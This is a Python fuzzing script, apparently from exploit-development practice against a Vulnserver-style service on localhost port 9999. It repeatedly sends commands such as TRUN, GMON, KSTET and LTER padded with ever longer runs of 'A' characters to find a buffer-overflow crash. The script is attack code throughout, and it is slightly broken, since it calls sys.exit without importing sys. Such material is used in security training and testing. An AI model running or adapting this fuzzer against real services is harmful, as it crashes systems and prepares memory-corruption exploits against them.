import socket
from time import sleep
ip = "127.0.0.1"
port= 9999
c=0
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
data=s.recv(1024)
while True:
     try:
          c=c+1
          buffer="A"*100
          buffer=buffer*c+"\r\n\r\n"
          
          
          
          s.send("STATS ."+buffer)
          data=s.recv(1024)
          print(data+" size 20x"+str(c))
          sleep(0.1)
          
          s.send("RTIME ."+buffer)
          data=s.recv(1024)
          print(data+" size 20x"+str(c))
          sleep(0.1)
          
          s.send("LTIME ."+buffer)
          data=s.recv(1024)
          print(data+" size 20x"+str(c))
          sleep(0.1)
          
          s.send("SRUN ."+buffer)
          data=s.recv(1024)
          print(data+" size 20x"+str(c))
          sleep(0.1)
       
          s.send("TRUN ."+buffer)
          data=s.recv(1024)
          print(data+" size 10x"+str(c))
          sleep(0.1)
          
          s.send("GMON /"+buffer)
          data=s.recv(1024)
          print(data+" size 10x"+str(c))
          sleep(0.1)
          
          s.send("GDOG ."+buffer)
          data=s.recv(1024)
          print(data+" size 10x"+str(c))
          sleep(0.1)
          
          s.send("KSTET "+buffer)
          data=s.recv(1024)
          print(data+" size 10x"+str(c))
          sleep(1)
       
          s.send("GTER "+buffer)
          data=s.recv(1024)
          print(data+" size 20x"+str(c))
          sleep(0.1)
          
          s.send("HTER "+buffer)
          data=s.recv(1024)
          print(data+" size 10x"+str(c))
          sleep(0.1)
          
          print("LTER\n")
          s.send("LTER ."+buffer)
          data=s.recv(1024)
          print(data+" size 10x"+str(c))
          sleep(0.1)
          
          s.send("KSTAN ."+buffer)
          data=s.recv(1024)
          print(data+" size 10x"+str(c))
          sleep(0.1)
          
     except:
          print(data)
          sys.exit()
          
